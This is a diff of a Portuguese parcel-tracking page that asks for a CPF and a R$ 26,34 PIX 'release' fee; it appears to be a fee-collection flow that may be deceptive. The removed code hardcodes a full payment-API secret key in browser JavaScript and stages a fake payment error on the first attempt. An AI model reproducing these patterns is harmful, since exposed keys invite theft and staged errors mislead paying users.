@@ -515,134 +515,20 @@
         </div>
     </footer>
 
-    <!-- Script de configuração da API Secret - ZENTRA PAY OFICIAL -->
     <script>
-        // ✅ CONFIGURAÇÃO ZENTRA PAY BRASIL
-        // 🔑 INSERIR SUA CHAVE API SECRET AQUI:
-        window.ZENTRA_PAY_SECRET_KEY = 'sk_a7da0a8cfc7bac4836572ab2068fd3059493dd63a97ab76ceb5dd46b50a9941f654da937b48ae2a4ded1468217c0291be0eccc264ecd9e92ca9eff27231c968e';
-        
-        // Configure o valor em reais (R$ 26,34)
-        window.valor_em_reais = 26.34;
-        
-        // 🔗 WEBHOOK URL PARA CONFIGURAR NA ZENTRA PAY:
-        // Configure esta URL no painel da Zentra Pay como webhook:
-        console.log('🔗 Webhook URL para Zentra Pay:', window.location.origin + '/webhook/zentra-pay');
-        
-        // Função para configurar a API secret dinamicamente
-        function configurarZentraPay(apiSecret, valorReais = 26.34) {
-            window.ZENTRA_PAY_SECRET_KEY = apiSecret;
-            window.valor_em_reais = valorReais;
-            localStorage.setItem('zentra_pay_secret_key', apiSecret);
-            console.log('✅ Zentra Pay configurado com sucesso!');
-            console.log('💰 Valor configurado: R$', valorReais.toFixed(2));
-            console.log('🔑 API Secret Header: Authorization: Bearer ' + apiSecret.substring(0, 20) + '...');
-        }
-        
-        // Expor função globalmente
-        window.configurarZentraPay = configurarZentraPay;
-        
-        // Log de confirmação
-        console.log('🔑 Zentra Pay Brasil configurado!');
-        console.log('💰 Valor padrão: R$ 26,34');
-        console.log('🚀 Sistema pronto para gerar PIX automático!');
-        console.log('📋 Endpoint: POST https://api.zentrapaybr.com/v1/transactions');
-        console.log('📋 Headers: Authorization: Bearer + Content-Type: application/json');
-        console.log('📋 Resposta esperada: pix_code (código copia e cola)');
-        
-        // 🔗 Exibir URL do webhook
-        console.log('');
-        console.log('🔗 CONFIGURE ESTE WEBHOOK NA ZENTRA PAY:');
-        console.log('URL:', window.location.origin + '/webhook/zentra-pay');
-        console.log('Método: POST');
-        console.log('');
-    </script>
-    
-    <script>
-        // Generate random order number
-        function generateOrderNumber() {
-            const prefix = 'CH';
-            let digits = '';
-            for (let i = 0; i < 8; i++) {
-                digits += Math.floor(Math.random() * 10);
-            }
-            return prefix + digits;
-        }
-        
-        // Set random order number
+        // Sistema de rastreamento simplificado
         document.addEventListener('DOMContentLoaded', function() {
-            const orderNumberDisplay = document.getElementById('orderNumberDisplay');
-            if (orderNumberDisplay) {
-                orderNumberDisplay.textContent = generateOrderNumber();
-            }
+            // Importar e inicializar sistema
+            import('./src/components/simple-tracking.js').then(module => {
+                window.simpleTracking = new module.SimpleTrackingSystem();
+                console.log('✅ Sistema de rastreamento carregado');
+            }).catch(error => {
+                console.error('❌ Erro ao carregar sistema:', error);
+            });
             
-            // Setup track order button
-            const trackOrderButton = document.getElementById('trackOrderPopupButton');
-            if (trackOrderButton) {
-                trackOrderButton.addEventListener('click', function() {
-                    // Close popup
-                    const popup = document.getElementById('orderConfirmationPopup');
-                    if (popup) {
-                        popup.style.display = 'none';
-                    }
-                    
-                    // Focus on CPF input
-                    const cpfInput = document.getElementById('cpfInput');
-                    if (cpfInput) {
-                        // Scroll to the tracking form
-                        const trackingForm = document.querySelector('.tracking-form');
-                        if (trackingForm) {
-                            trackingForm.scrollIntoView({ behavior: 'smooth' });
-                        }
-                        
-                        // Focus on the CPF input after scrolling
-                        setTimeout(() => {
-                            cpfInput.focus();
-                        }, 800);
-                    }
-                });
-            }
-            
-            // Setup close button
-            const closePopupButton = document.getElementById('closePopupButton');
-            if (closePopupButton) {
-                closePopupButton.addEventListener('click', function() {
-                    const popup = document.getElementById('orderConfirmationPopup');
-                    if (popup) {
-                        popup.style.display = 'none';
-                    }
-                });
-            }
-        });
-    </script>
-
-    <script>
-        // Configurar eventos do modal de liberação
-        document.addEventListener('DOMContentLoaded', function() {
-            const simulateButton = document.getElementById('simulatePaymentButton');
+            // Configurar modal de liberação
             const closeButton = document.getElementById('closeModal');
             const modal = document.getElementById('liberationModal');
-            
-            if (simulateButton) {
-                simulateButton.addEventListener('click', function() {
-                    // Simular erro na primeira tentativa
-                    if (!this.hasAttribute('data-retry')) {
-                        this.setAttribute('data-retry', 'true');
-                        alert('Ocorreu um erro ao tentar processar o pagamento');
-                        this.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
-                        return;
-                    }
-                    
-                    // Segunda tentativa - sucesso
-                    if (modal) {
-                        modal.style.display = 'none';
-                    }
-                    
-                    // Processar pagamento com sucesso
-                    if (window.trackingSystemInstance) {
-                        window.trackingSystemInstance.processSuccessfulPayment();
-                    }
-                });
-            }
             
             if (closeButton) {
                 closeButton.addEventListener('click', function() {
@@ -662,6 +548,5 @@
         });
     </script>
 
-    <script type="module" src="tracking-system.js"></script>
 </body>
 </html>
